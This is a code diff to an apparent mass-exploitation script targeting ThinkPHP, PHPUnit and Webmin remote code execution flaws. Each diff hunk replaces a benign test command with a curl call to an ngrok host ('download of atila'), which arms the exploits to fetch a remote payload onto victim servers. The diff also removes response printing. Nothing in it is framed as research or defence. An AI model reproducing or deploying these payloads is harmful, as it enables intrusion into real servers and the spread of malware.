@@ -51,7 +51,7 @@ def think_cve( target )  :
 
 
 
-   payload = '/index.php?s=/Index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id ; date ; whoami'
+   payload = '/index.php?s=/Index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=curl  https://knapsack-trickster-dance.ngrok-free.dev/hunos'
    
 
 
@@ -87,7 +87,7 @@ def php_unit( target ) :
 
 
 
-    payload  =    '<?php  system (''); ?>'   #download of atila
+    payload  =    '<?php  system ("curl  https://knapsack-trickster-dance.ngrok-free.dev/hunos"); ?>'   #download of atila
 
 
 
@@ -110,7 +110,7 @@ def webmin_cve (target):
 
 
 
- cmd =   ''  #download of atila
+ cmd =   'curl  https://knapsack-trickster-dance.ngrok-free.dev/hunos'  #download of atila
 
 
 
@@ -151,8 +151,5 @@ def webmin_cve (target):
 
 
  r = requests.post( target, headers=h  , data=data ,  verify=0 , timeout=10)
-
- print(r.text)
-  
 
 
